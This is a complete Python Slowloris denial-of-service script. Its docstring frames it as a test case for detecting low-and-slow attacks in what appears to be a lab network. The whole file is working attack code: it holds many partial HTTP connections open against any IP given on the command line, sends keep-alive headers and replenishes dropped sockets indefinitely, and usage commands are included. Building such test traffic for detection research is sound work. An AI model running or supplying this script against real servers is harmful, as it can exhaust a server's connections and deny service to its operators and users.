"""
slowloris_attack.py
=====================
Low-and-slow attack: opens many TCP connections to a victim's HTTP port
and sends partial headers very slowly, exhausting the server's connection
pool WITHOUT ever generating high packet/byte volume.

This is the key test case for corner case #2 (low-and-slow attacks) -
volumetric features alone (packet_rate, byte_rate) will NOT flag this;
it mainly shows up as many long-duration, low-packet-count flows.

Run a simple HTTP server on the victim host first, e.g.:
  h1: python3 -m http.server 80

Then from the attacker host:
  python3 slowloris_attack.py <victim_ip> --port 80 --sockets 150
"""

import argparse
import socket
import time
import random


def slowloris(target_ip, port, num_sockets, interval):
    print(f"[*] Opening {num_sockets} sockets to {target_ip}:{port}")
    sockets = []

    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, port))
            s.send(
                f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8")
            )
            sockets.append(s)
        except socket.error:
            pass

    print(f"[*] {len(sockets)} sockets established. Sending keep-alive headers "
          f"every {interval}s to hold connections open indefinitely.")

    try:
        while True:
            print(f"[*] Sending keep-alive to {len(sockets)} connections...")
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    sockets.remove(s)

            # Replenish any dropped sockets
            while len(sockets) < num_sockets:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, port))
                    s.send(
                        f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n".encode("utf-8")
                    )
                    sockets.append(s)
                except socket.error:
                    break

            time.sleep(interval)
    except KeyboardInterrupt:
        print("[*] Stopping attack, closing sockets.")
        for s in sockets:
            s.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Slowloris low-and-slow attack")
    parser.add_argument("target", help="Victim IP address")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--sockets", type=int, default=150)
    parser.add_argument("--interval", type=int, default=10,
                         help="Seconds between keep-alive sends")
    args = parser.parse_args()
    slowloris(args.target, args.port, args.sockets, args.interval)
